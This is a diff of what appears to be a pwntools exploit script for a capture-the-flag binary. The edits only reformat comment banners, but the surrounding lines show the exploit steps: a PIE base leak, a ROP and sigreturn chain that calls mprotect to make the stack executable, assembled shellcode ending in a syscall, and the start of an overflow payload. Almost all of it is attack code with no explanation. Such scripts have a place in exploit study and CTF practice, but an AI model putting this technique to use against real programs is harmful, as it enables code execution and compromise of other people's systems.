@@ -35,7 +35,7 @@ continue
 
 io = start()
 
-#--------------------[ STEP 1 : PIE_BASE ]--------------------
+#--------------------------------[ STEP 1 : PIE_BASE ]--------------------------------
 
 io.recvuntil(b'>> Secure channel established at ')
 leak_vals = io.recvline().split(b':')
@@ -47,7 +47,7 @@ pie_base = vuln_addr - exe.sym['vuln']
 exe.address = pie_base
 log.success(f"exe.address @ {hex(exe.address)}")
 
-#--------------------[ STEP 2 : MAKE STACk RWX WITH MPROTECT SYSCALL ]--------------------
+#------------------[ STEP 2 : MAKE STACk RWX WITH MPROTECT SYSCALL ]------------------
 
 # Setup ROP and gadgets
 rop = ROP(exe)
@@ -67,7 +67,7 @@ frame.rdx = 7             # PROT_READ | PROT_WRITE | PROT_EXEC
 frame.rip = syscall_gad   # syscall; ret gadget address
 frame.rsp = buf_addr  # new stack pointer after sigreturn
 
-#--------------------[ STEP 3 : SHELLCODE ]--------------------
+#-------------------------------[ STEP 3 : SHELLCODE ]-------------------------------
 
 shellcode = asm('''
     xor rsi, rsi                    
@@ -80,7 +80,7 @@ shellcode = asm('''
     syscall
 ''')
 
-#--------------------[ STEP 4 : PAYLOAD ]--------------------
+#--------------------------------[ STEP 4 : PAYLOAD ]--------------------------------
 
 offset = 16
 payload=p64(buf_addr+8)
